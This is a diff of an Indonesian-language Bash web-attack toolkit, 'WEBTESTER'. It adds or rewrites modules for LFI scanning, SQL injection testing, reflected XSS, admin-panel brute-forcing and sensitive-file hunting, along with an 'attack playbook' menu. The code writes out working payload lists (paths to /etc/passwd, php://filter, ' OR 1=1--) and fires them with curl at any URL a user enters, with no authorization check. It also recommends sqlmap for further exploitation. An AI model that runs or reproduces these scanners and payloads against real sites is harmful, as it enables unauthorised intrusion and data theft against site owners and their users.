@@ -151,154 +151,270 @@ function start_scanner {
     echo -e "\e[33mTekan Enter untuk kembali ke menu.\e[0m"
     read
 }
-# --- [ MODUL 02: SQL INJECTION AUTO TESTER ] ---
+# --- [ MODUL 01: LFI SCANNER ] ---
+function start_scanner {
+    clear
+    local nama_modul="LFI SCANNER"
+    
+    # Header Estetik
+    echo -e "${C}============================================================================="
+    echo -e "                 MODUL 01: LOCAL FILE INCLUSION (LFI) SCANNER PRO             "
+    echo -e "=============================================================================${NC}"
+    
+    echo -e "${WARN} APA ITU LFI?"
+    echo -e "${DG}ID: Kerentanan pada parameter URL yang mengizinkan pembacaan file internal server."
+    echo -e "${DG}EN: Vulnerability in URL parameters allowing unauthorized local file access."
+    echo -e "${NC}-----------------------------------------------------------------------------"
 
+    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/v.php?id=): ${W}"
+    read target
+
+    # Validasi Input
+    if [[ -z "$target" ]]; then
+        echo -e "${ERR} URL tidak boleh kosong!"; return
+    fi
+    if [[ "$target" != *"="* ]]; then
+        echo -e "${WARN} Peringatan: URL mungkin butuh parameter (contoh: ?page=)"
+    fi
+
+    # Logika Penamaan File & Normalisasi
+    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | cut -d'.' -f1)
+    log_file="${domain_clean^^}_LFI_AUDIT.txt"
+    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0"
+
+    # Payload List
+    paths=("/etc/passwd" "/etc/hosts" "../../../../../../../../etc/passwd" "../../../../../../../../etc/passwd%00" "....//....//....//....//etc/passwd" "php://filter/convert.base64-encode/resource=index.php" "php://input" "/proc/self/environ" "C:\Windows\win.ini" "/etc/issue")
+
+    echo -e "\n${INFO} Target   : ${W}$target"
+    echo -e "${INFO} Log File : ${DG}$log_file${NC}"
+    echo "-----------------------------------------------------------------------------"
+
+    # Inisialisasi Log
+    {
+        echo "LFI DETAILED AUDIT REPORT"
+        echo "TARGET : $target"
+        echo "DATE   : $(date)"
+        echo "---------------------------------------------------------------------"
+        printf "%-10s | %-50s | %-15s\n" "HTTP" "PAYLOAD" "RESULT"
+        echo "---------------------------------------------------------------------"
+    } > "$log_file"
+
+    found=0
+    total=${#paths[@]}
+    index=0
+
+    for path in "${paths[@]}"; do
+        ((index++))
+        # UI Progress
+        echo -ne "  ${INFO} Scanning [$index/$total]...\r"
+        
+        tmp_res=$(mktemp)
+        http_code=$(curl -s -k -L -A "$ua" --connect-timeout 6 -o "$tmp_res" -w "%{http_code}" "$target$path")
+        response=$(cat "$tmp_res")
+        rm -f "$tmp_res"
+
+        status="SECURE"
+        log_status="SECURE"
+        
+        # Logika Deteksi
+        if [[ "$response" == *"root:x:0:0"* || "$response" == *"[extensions]"* || "$response" == *"PD9waHA"* || "$response" == *"127.0.0.1"* ]]; then
+            status="${G}${BOLD}VULNERABLE!${NC}"
+            log_status="VULNERABLE"
+            echo -e "  ${OK} ${W}$http_code | ${C}$path ${W}-> $status"
+            ((found++))
+        elif [[ "$http_code" == "403" || "$http_code" == "406" ]]; then
+            status="${P}WAF DETECTED${NC}"
+            log_status="WAF/BLOCKED"
+        fi
+
+        if [[ "$log_status" != "SECURE" ]]; then
+            printf "%-10s | %-50s | %-15s\n" "$http_code" "$path" "$log_status" >> "$log_file"
+        fi
+    done
+
+    echo -e "${NC}-----------------------------------------------------------------------------"
+    if [ $found -gt 0 ]; then
+        echo -e "${OK} ${G}${BOLD}SELESAI! Ditemukan $found celah potensial.${NC}"
+        echo "TOTAL VULNERABILITIES FOUND: $found" >> "$log_file"
+    else
+        echo -e "${ERR} ${R}SELESAI. Tidak ditemukan celah dasar.${NC}"
+        echo "RESULT: NO BASIC VULN FOUND" >> "$log_file"
+    fi
+    
+    echo -e "\n${INFO} Log tersimpan di: ${DG}$log_file"
+    echo -e "${C}Tekan Enter untuk kembali ke menu.${NC}"
+    read
+}
+# --- [ MODUL 02:  SQLI INJECTION] ---
 function start_sqli_tester {
     clear
     local nama_modul="SQLI TESTER"
     
-    echo -e "\e[36m============================================================================="
-    echo -e "                 MODUL 02: SQL INJECTION (SQLi) AUTO TESTER                  "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mencari celah Error-Based SQLi pada parameter URL."
+    echo -e "${C}============================================================================="
+    echo -e "                MODUL 02: SQL INJECTION (SQLi) AUTO TESTER PRO               "
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mendeteksi Error-Based, Boolean-Based, dan Potensi WAF."
     echo "-----------------------------------------------------------------------------"
     
-    read -p "Masukkan URL Full (contoh: http://site.com/product.php?id=1): " target
+    echo -ne "${Q} Masukkan URL Full (contoh: http://site.com/product.php?id=1): ${W}"
+    read target
 
     if [[ -z "$target" ]]; then 
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} URL tidak boleh kosong!"; return
     fi
 
-    # Ekstraksi nama domain murni
-    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | awk -F. '{if (NF>1) print $(NF-1); else print $1}')
-    log_file="${domain_clean^^} ${nama_modul}.txt"
+    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | cut -d'.' -f1)
+    log_file="${domain_clean^^}_SQLI_AUDIT.txt"
 
-    # List payload untuk memicu error database
-    sqli_payloads=("'" "''" "\"" "\"\"" "')" "';" "admin'--" "' OR 1=1--" "' OR '1'='1" " order by 10--")
+    echo -e "${INFO} Mengambil data respons dasar..."
+    base_res=$(curl -s -k -L --connect-timeout 10 "$target")
+    base_size=${#base_res}
 
-    echo -e "\n[*] Memulai Scanning di: $target"
-    echo -e "[*] File Log: $log_file"
+    sqli_payloads=("'" "\"" "')" "'))" "' OR 1=1--" "' AND 1=2--" "' ORDER BY 1--" "' ORDER BY 100--" "admin'--" "/**/AND/**/1=1")
+
+    echo -e "\n${INFO} Target      : ${W}$target"
+    echo -e "${INFO} Base Size   : ${C}$base_size bytes"
+    echo -e "${INFO} File Log    : ${DG}$log_file${NC}"
     echo "-----------------------------------------------------------------------------"
 
-    # Inisialisasi Header Tabel di Log
     {
-        echo "====================================================="
-        echo "          SQLi DETAILED AUDIT REPORT                 "
-        echo "====================================================="
+        echo "SQLi DETAILED AUDIT REPORT PRO"
         echo "TARGET : $target"
         echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-25s | %-30s\n" "PAYLOAD INJECTED" "HASIL / RESPONS SERVER"
-        echo "-----------------------------------------------------"
+        echo "---------------------------------------------------------------------"
+        printf "%-20s | %-10s | %-15s | %-15s\n" "PAYLOAD" "HTTP" "SIZE DIFF" "STATUS"
+        echo "---------------------------------------------------------------------"
     } > "$log_file"
 
     found=0
     for polyglot in "${sqli_payloads[@]}"; do
-        echo -ne "  [*] Injecting Payload: $polyglot \r"
+        echo -ne "  ${INFO} Testing: ${C}$polyglot ${NC}\r"
         
-        response=$(curl -s -k -L --connect-timeout 10 "$target$polyglot")
+        tmp_file=$(mktemp)
+        http_code=$(curl -s -k -L --connect-timeout 10 -o "$tmp_file" -w "%{http_code}" "$target$polyglot")
+        response=$(cat "$tmp_file")
+        res_size=${#response}
+        size_diff=$((res_size - base_size))
+        rm -f "$tmp_file"
 
-        # Deteksi pesan error database
-        if echo "$response" | grep -qiE "mysql_fetch_array|SQL syntax|Unclosed quotation mark|PostgreSQL query failed|Oracle Error|MariaDB server version|Syntax error|Dynamic SQL Error|ORA-00933"; then
-            status="VULNERABLE (ERROR DETECTED)"
-            echo -e "  \e[31m[!!!] $polyglot -> $status\e[0m"
+        status="NORMAL"
+        msg_color="${DG}"
+
+        if echo "$response" | grep -qiE "mysql_|SQL syntax|Unclosed|PostgreSQL|Oracle Error|MariaDB|Syntax error|ORA-00933|SQLSTATE"; then
+            status="VULN (ERROR)"
+            msg_color="${R}${BOLD}"
             ((found++))
-        else
-            status="NORMAL (NO ERROR)"
+        elif [[ "$polyglot" == *"1=1"* && "$size_diff" -ne 0 ]]; then
+            status="POTENTIAL BLIND"
+            msg_color="${Y}"
+            ((found++))
+        elif [[ "$http_code" == "403" ]]; then
+            status="WAF BLOCKED"
+            msg_color="${P}"
         fi
 
-        # Tulis ke tabel log (dengan format kolom)
-        printf "%-25s | %-30s\n" "$polyglot" "$status" >> "$log_file"
-        sleep 0.4
+        if [[ "$status" != "NORMAL" ]]; then
+            echo -e "  ${OK} Payload: ${W}${polyglot} ${NC}| Status: ${msg_color}${status}${NC} | Diff: ${C}${size_diff}${NC}"
+            printf "%-20s | %-10s | %-15s | %-15s\n" "$polyglot" "$http_code" "$size_diff" "$status" >> "$log_file"
+        fi
+        sleep 0.2
     done
 
     echo -ne "                                                                                \r"
-    echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$log_file"
+    echo -e "-----------------------------------------------------------------------------"
 
     if [ $found -gt 0 ]; then
-        echo -e "\e[32m[✓] Sukses! $found Payload memicu error. Cek '$log_file'\e[0m"
-        echo "KESIMPULAN: TARGET RENTAN TERHADAP ERROR-BASED SQLi" >> "$log_file"
-        echo "TOTAL TEMUAN: $found PAYLOAD" >> "$log_file"
+        echo -e "${OK} ${G}Scan Selesai! $found indikasi SQLi ditemukan.${NC}"
+        echo -e "${WARN} ${Y}TIPS: Gunakan 'sqlmap -u \"$target\" --dbs' untuk eksploitasi lanjut.${NC}"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan Error Database.\e[0m"
-        echo "KESIMPULAN: TIDAK DITEMUKAN MASALAH (SQLi ERROR-BASED)" >> "$log_file"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ditemukan celah SQLi dasar.${NC}"
     fi
     
-    echo -e "\n\e[33mTekan Enter untuk kembali ke menu.\e[0m"
+    echo -e "\n${C}Tekan Enter untuk kembali.${NC}"
     read
 }
 # --- [ MODUL 02: STRATEGY PLAYBOOK ] ---
-
 function show_strategy {
     clear
-    echo -e "\e[33m"
-    echo "============================================================================="
-    echo "          WEBTESTER COMPLETE ATTACK PLAYBOOK (FULL 20 MODULES)               "
-    echo "============================================================================="
-    echo -e "\e[0m"
+    # Header menggunakan warna Cyan (C) agar terlihat profesional
+    echo -e "${C}============================================================================="
+    echo -e "           ${BOLD}WEBTESTER COMPLETE ATTACK PLAYBOOK (FULL 20 MODULES)${NC}${C}          "
+    echo -e "=============================================================================${NC}"
     
-    echo -e "\e[35m[ FASE 1: RECONNAISSANCE - Pengumpulan Informasi ]\e[0m"
-    echo " 06 -> Cari semua Subdomain untuk memperluas target."
-    echo " 08 -> Scan Port & Service untuk melihat pintu masuk (SSH, FTP, HTTP)."
-    echo " 13 -> Cek apakah ada Subdomain yang bisa diambil alih (Takeover)."
+    # FASE 1 - Reconnaissance
+    echo -e "${P}[ FASE 1: RECONNAISSANCE - Pengumpulan Informasi ]${NC}"
+    echo -e " ${C}06${NC} -> Cari semua Subdomain untuk memperluas target."
+    echo -e " ${C}08${NC} -> Scan Port & Service untuk melihat pintu masuk (SSH, FTP, HTTP)."
+    echo -e " ${C}13${NC} -> Cek apakah ada Subdomain yang bisa diambil alih (Takeover)."
     echo ""
-    echo -e "\e[35m[ FASE 2: CONTENT DISCOVERY - Pemetaan Struktur ]\e[0m"
-    echo " 07 -> Brute-force Folder/Direktori tersembunyi."
-    echo " 04 -> Cari halaman Admin khusus (Admin Panel Finder)."
-    echo " 15 -> Temukan Endpoint API (REST/GraphQL) yang sering terlupakan."
-    echo " 09 -> Identifikasi CMS (WP/Joomla) dan cari celah spesifiknya."
+
+    # FASE 2 - Content Discovery
+    echo -e "${P}[ FASE 2: CONTENT DISCOVERY - Pemetaan Struktur ]${NC}"
+    echo -e " ${C}07${NC} -> Brute-force Folder/Direktori tersembunyi."
+    echo -e " ${C}04${NC} -> Cari halaman Admin khusus (Admin Panel Finder)."
+    echo -e " ${C}15${NC} -> Temukan Endpoint API (REST/GraphQL) yang sering terlupakan."
+    echo -e " ${C}09${NC} -> Identifikasi CMS (WP/Joomla) dan cari celah spesifiknya."
     echo ""
-    echo -e "\e[35m[ FASE 3: VULNERABILITY SCANNING - Pencarian Celah ]\e[0m"
-    echo " 05 -> Hunting file sensitif (.env, .git, .sql) secara langsung."
-    echo " 01 -> Eksploitasi LFI jika ada parameter file."
-    echo " 02 -> Uji SQL Injection untuk menembus database."
-    echo " 03 -> Uji XSS untuk menyerang sisi client/user."
+
+    # FASE 3 - Vulnerability Scanning
+    echo -e "${P}[ FASE 3: VULNERABILITY SCANNING - Pencarian Celah ]${NC}"
+    echo -e " ${C}05${NC} -> Hunting file sensitif (.env, .git, .sql) secara langsung."
+    echo -e " ${C}01${NC} -> Eksploitasi ${R}LFI${NC} jika ada parameter file."
+    echo -e " ${C}02${NC} -> Uji ${R}SQL Injection${NC} untuk menembus database."
+    echo -e " ${C}03${NC} -> Uji ${R}XSS${NC} untuk menyerang sisi client/user."
     echo ""
-    echo -e "\e[35m[ FASE 4: ADVANCED EXPLOITATION - Penetrasi Dalam ]\e[0m"
-    echo " 11 -> Gunakan SSRF untuk memukul server internal dari dalam."
-    echo " 16 -> Uji IDOR (Broken Access Control) untuk akses data user lain."
-    echo " 17 -> Lakukan HTTP Smuggling untuk memanipulasi Load Balancer."
-    echo " 18 -> Debug dan hack JWT Token untuk bypass login."
-    echo " 10 -> Jika memungkinkan, eksekusi perintah sistem (RCE)."
+
+    # FASE 4 - Advanced Exploitation
+    echo -e "${P}[ FASE 4: ADVANCED EXPLOITATION - Penetrasi Dalam ]${NC}"
+    echo -e " ${C}11${NC} -> Gunakan ${Y}SSRF${NC} untuk memukul server internal dari dalam."
+    echo -e " ${C}16${NC} -> Uji ${Y}IDOR${NC} (Broken Access Control) untuk akses data user lain."
+    echo -e " ${C}17${NC} -> Lakukan ${Y}HTTP Smuggling${NC} untuk memanipulasi Load Balancer."
+    echo -e " ${C}18${NC} -> Debug dan hack ${Y}JWT Token${NC} untuk bypass login."
+    echo -e " ${C}10${NC} -> Jika memungkinkan, eksekusi perintah sistem (${R}${BLINK}RCE${NC})."
     echo ""
-    echo -e "\e[35m[ FASE 5: POST-EXPLOITATION & ANALYSIS ]\e[0m"
-    echo " 12 -> Cek miskonfigurasi CORS untuk pencurian data antar domain."
-    echo " 14 -> Cari bucket Cloud (S3/GCP) yang terbuka publik."
-    echo " 19 -> Analisis Security Headers & SSL untuk celah enkripsi."
-    echo " 20 -> Bedah file JavaScript untuk menemukan API Keys rahasia."
+
+    # FASE 5 - Post-Exploitation
+    echo -e "${P}[ FASE 5: POST-EXPLOITATION & ANALYSIS ]${NC}"
+    echo -e " ${C}12${NC} -> Cek miskonfigurasi ${DG}CORS${NC} untuk pencurian data antar domain."
+    echo -e " ${C}14${NC} -> Cari bucket Cloud (${DG}S3/GCP${NC}) yang terbuka publik."
+    echo -e " ${C}19${NC} -> Analisis Security Headers & SSL untuk celah enkripsi."
+    echo -e " ${C}20${NC} -> Bedah file JavaScript untuk menemukan API Keys rahasia."
     echo ""
-    echo "============================================================================="
-    echo " TIPS: Mulailah dari Fase 1 ke Fase 5 untuk hasil penetrasi maksimal."
-    echo "============================================================================="
-    read -p "Tekan Enter untuk kembali ke Menu Utama..."
+
+    echo -e "${C}=============================================================================${NC}"
+    echo -e " ${WARN} ${BOLD}TIPS:${NC} Mulailah dari ${G}Fase 1${NC} ke ${G}Fase 5${NC} untuk hasil penetrasi maksimal."
+    echo -e "${C}=============================================================================${NC}"
+    
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke Menu Utama...${NC}"
+    read
 }
+
 # --- [ MODUL 03: XSS REFLECTED SCANNER (DETAILED TABLE) ] ---
 
 function start_xss_scanner {
     clear
     local nama_modul="XSS REFLECTED SCANNER"
     
-    echo -e "\e[36m"
-    echo "============================================================================="
-    echo "                 MODUL 03: $nama_modul                             "
-    echo "============================================================================="
-    echo -e "\e[0m"
-    echo -e "\e[33m[ INFO ]:\e[0m Menguji apakah input URL dipantulkan (reflected) ke browser."
+    # Header Estetik
+    echo -e "${C}============================================================================="
+    echo -e "                 MODUL 03: $nama_modul                              "
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Menguji apakah input URL dipantulkan (reflected) ke browser."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan URL Full (contoh: http://site.com/search.php?q=): " target
+    echo -ne "${Q} Masukkan URL Full (contoh: http://site.com/search.php?q=): ${W}"
+    read target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} URL tidak boleh kosong!"; return
     fi
 
-    # --- LOGIKA PENAMAAN FILE ---
+    # --- LOGIKA PENAMAAN FILE (DIPERBAIKI) ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    # Menghapus karakter ilegal untuk nama file
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_XSS_AUDIT.txt"
 
     # Payload XSS Terkurasi
     xss_payloads=(
@@ -314,14 +430,14 @@ function start_xss_scanner {
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 
-    echo -e "\n[*] Memulai Scanning XSS pada: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Memulai Scanning XSS pada: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
-    # Inisialisasi Header Tabel di Log
+    # Inisialisasi Header Tabel di Log (Gunakan kutip pada $filename)
     {
         echo "====================================================="
-        echo "          XSS DETAILED AUDIT REPORT                  "
+        echo "           XSS DETAILED AUDIT REPORT                 "
         echo "====================================================="
         echo "TARGET : $target"
         echo "DATE   : $(date)"
@@ -332,70 +448,75 @@ function start_xss_scanner {
 
     found_xss=0
     for payload in "${xss_payloads[@]}"; do
-        echo -ne "  [*] Testing: $payload \r"
+        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
         
         # URL Encode payload menggunakan Python
         encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
         
         # Kirim request
-        response=$(curl -s -k -L -A "$ua" "$target$encoded_payload")
+        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")
 
         # Cek apakah payload dipantulkan utuh (Reflected)
         if [[ "$response" == *"$payload"* ]]; then
             status="TERPANTUL (VULN)"
-            echo -e "  \e[31m[!!!] $payload -> $status\e[0m"
+            echo -e "  ${OK} ${R}${BOLD}$payload${NC} -> ${R}VULNERABLE!${NC}"
             ((found_xss++))
         else
             status="TERFILTER/AMAN"
         fi
 
-        # Tulis ke tabel log
+        # Tulis ke tabel log (Gunakan kutip pada $filename)
         printf "%-45s | %-20s\n" "$payload" "$status" >> "$filename"
         sleep 0.2
     done
 
+    # Membersihkan baris testing
     echo -ne "                                                                                \r"
-    echo -e "\n-----------------------------------------------------------------------------"
+    echo -e "-----------------------------------------------------------------------------"
     echo "-----------------------------------------------------" >> "$filename"
     
     if [ $found_xss -eq 0 ]; then
-        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan indikasi Reflected XSS.\e[0m"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ditemukan indikasi Reflected XSS.${NC}"
         echo "KESIMPULAN: TIDAK DITEMUKAN MASALAH (XSS REFLECTED)" >> "$filename"
     else
-        echo -e "\e[32m[+] Scan Selesai! $found_xss celah potensial ditemukan.\e[0m"
+        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_xss celah potensial ditemukan.${NC}"
         echo "KESIMPULAN: TARGET RENTAN TERHADAP REFLECTED XSS" >> "$filename"
         echo "TOTAL TEMUAN: $found_xss" >> "$filename"
     fi
     
-    echo -e "[*] Laporan lengkap tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Laporan lengkap tersimpan di: ${DG}$filename"
+    echo -e "${C}Tekan Enter untuk kembali ke menu.${NC}"
+    read
 }
+
 # --- [ MODUL 04: ADMIN PANEL FINDER (DETAILED TABLE) ] ---
 
 function start_admin_finder {
     clear
     local nama_modul="ADMIN FINDER"
     
-    echo -e "\e[36m============================================================================="
+    # Header Estetik
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 04: ADMIN PANEL FINDER (ULTRA BRUTE)                  "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mencari gerbang masuk admin/backend pada target."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mencari gerbang masuk admin/backend pada target."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan URL Target (contoh: http://site.com/): " target
+    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
+    read target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} URL tidak boleh kosong!"; return
     fi
 
     # Memastikan URL diakhiri dengan /
     [[ "${target: -1}" != "/" ]] && target="$target/"
 
-    # Ekstraksi nama domain untuk penamaan file
+    # --- LOGIKA PENAMAAN FILE (DIPERBAIKI) ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_ADMIN_FINDER.txt"
 
     # Wordlist Admin Panel Terkurasi
     admin_paths=(
@@ -407,8 +528,8 @@ function start_admin_finder {
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 
-    echo -e "\n[*] Memulai Brute-force Path pada: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Memulai Brute-force Path pada: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
@@ -425,81 +546,83 @@ function start_admin_finder {
 
     found_admin=0
     for path in "${admin_paths[@]}"; do
-        echo -ne "  [*] Checking: /$path \r"
+        echo -ne "  ${INFO} Checking: ${C}/$path ${NC}\r"
 
         # Cek HTTP Status Code
-        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" "$target$path")
+        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 10 "$target$path")
 
         # Logika Penentuan Status
         if [[ "$status_code" == "200" ]]; then
             res_status="DITEMUKAN"
-            color="\e[32m"
+            res_color="${G}${BOLD}"
             ((found_admin++))
         elif [[ "$status_code" == "403" ]]; then
             res_status="DILARANG (403)"
-            color="\e[33m"
+            res_color="${Y}"
             ((found_admin++))
         elif [[ "$status_code" == "401" ]]; then
             res_status="BUTUH LOGIN"
-            color="\e[35m"
+            res_color="${P}"
             ((found_admin++))
         else
             res_status="TIDAK ADA"
-            color="\e[31m"
+            res_color="${DG}"
         fi
 
-        # Tampilkan di layar jika ditemukan/menarik
+        # Tampilkan di layar jika ditemukan/menarik (200, 403, 401)
         if [[ "$status_code" == "200" || "$status_code" == "403" || "$status_code" == "401" ]]; then
-             echo -e "  [+] $path -> ${color}$res_status\e[0m"
+             echo -e "  ${OK} ${W}/$path ${NC}-> ${res_color}$res_status${NC} (${W}$status_code${NC})"
+             # Tulis ke tabel log hanya temuan penting
+             printf "%-30s | %-10s | %-15s\n" "/$path" "$status_code" "$res_status" >> "$filename"
         fi
-
-        # Tulis ke tabel log (.txt)
-        printf "%-30s | %-10s | %-15s\n" "/$path" "$status_code" "$res_status" >> "$filename"
         
         sleep 0.05
     done
 
+    # Bersihkan baris progres
     echo -ne "                                                                                \r"
     echo -e "\n-----------------------------------------------------------------------------"
     echo "-----------------------------------------------------" >> "$filename"
     
     if [ $found_admin -gt 0 ]; then
-        echo -e "\e[32m[✓] Scan Selesai! $found_admin halaman potensial ditemukan.\e[0m"
+        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_admin halaman potensial ditemukan.${NC}"
         echo "KESIMPULAN: DITEMUKAN $found_admin HALAMAN AKSES BACKEND" >> "$filename"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan halaman admin standar.\e[0m"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ditemukan halaman admin standar.${NC}"
         echo "KESIMPULAN: TIDAK DITEMUKAN PATH ADMIN STANDAR" >> "$filename"
     fi
     
-    echo -e "[*] Laporan audit tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Laporan audit tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
-# --- [ MODUL 05: SENSITIVE FILE HUNTER (DETAILED TABLE) ] ---
-
+# --- [ MODUL 05: SENSITIVE FILE & SECRET HUNTER  ] ---
 function start_secret_hunter {
     clear
     local nama_modul="SECRET HUNTER"
     
-    echo -e "\e[36m============================================================================="
+    # Header Estetik
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 05: SENSITIVE FILE & SECRET HUNTER                    "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mencari file konfigurasi, backup, dan folder rahasia (Leaked Data)."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mencari file konfigurasi, backup, dan folder rahasia (Leaked Data)."
     echo "-----------------------------------------------------------------------------"
     
-    read -p "Masukkan URL Target (contoh: http://site.com/): " target
+    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
+    read target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} URL tidak boleh kosong!"; return
     fi
 
     # Memastikan URL diakhiri dengan /
     [[ "${target: -1}" != "/" ]] && target="$target/"
 
-    # Ekstraksi nama domain untuk penamaan file
+    # --- LOGIKA PENAMAAN FILE (DIPERBAIKI) ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_SECRET_HUNTER.txt"
 
     # Daftar file sensitif (High Risk)
     secrets=(
@@ -511,8 +634,8 @@ function start_secret_hunter {
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 
-    echo -e "\n[*] Memulai Hunting di: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Memulai Hunting di: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
@@ -529,50 +652,48 @@ function start_secret_hunter {
 
     found_secrets=0
     for file in "${secrets[@]}"; do
-        echo -ne "  [*] Hunting: /$file \r"
+        echo -ne "  ${INFO} Hunting: ${C}/$file ${NC}\r"
 
         # Cek HTTP Status & Ukuran Download
-        response=$(curl -s -k -L -A "$ua" -o /dev/null -w "%{http_code}:%{size_download}" "$target$file")
+        response=$(curl -s -k -L -A "$ua" -o /dev/null -w "%{http_code}:%{size_download}" --connect-timeout 10 "$target$file")
         status_code=$(echo $response | cut -d':' -f1)
         file_size=$(echo $response | cut -d':' -f2)
 
         if [[ "$status_code" == "200" && "$file_size" -gt 0 ]]; then
             res_status="DITEMUKAN"
             display_size="${file_size} bytes"
-            color="\e[32m"
-            echo -e "  [!] \e[32mFOUND:\e[0m /$file (${file_size} bytes)"
+            
+            echo -e "  ${OK} ${G}FOUND:${NC} ${W}/$file ${DG}(${file_size} bytes)${NC}"
             ((found_secrets++))
             
             # Peringatan khusus untuk .env
             if [[ "$file" == *".env"* ]]; then
-                 echo -e "      \e[31m[CRITICAL] Leakage detected in /$file\e[0m"
+                 echo -e "      ${R}${BLINK}[CRITICAL] Leakage detected in /$file${NC}"
             fi
         else
             res_status="TIDAK ADA"
             display_size="-"
-            color="\e[0m"
         fi
 
-        # Tulis ke tabel log (.txt)
+        # Tulis ke tabel log
         printf "%-30s | %-10s | %-15s\n" "/$file" "$status_code" "$display_size" >> "$filename"
-        
         sleep 0.05
     done
 
     echo -ne "                                                                                \r"
     echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
     
     if [ $found_secrets -gt 0 ]; then
-        echo -e "\e[32m[✓] Selesai! $found_secrets file sensitif terdeteksi.\e[0m"
+        echo -e "${OK} ${G}${BOLD}Selesai! $found_secrets file sensitif terdeteksi.${NC}"
         echo "KESIMPULAN: DITEMUKAN $found_secrets FILE SENSITIF TERBUKA" >> "$filename"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ditemukan file sensitif umum.\e[0m"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ditemukan file sensitif umum.${NC}"
         echo "KESIMPULAN: TIDAK DITEMUKAN FILE RAHASIA (CLEAN)" >> "$filename"
     fi
     
-    echo -e "[*] Laporan audit tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Laporan audit tersimpan di: ${DG}$filename"
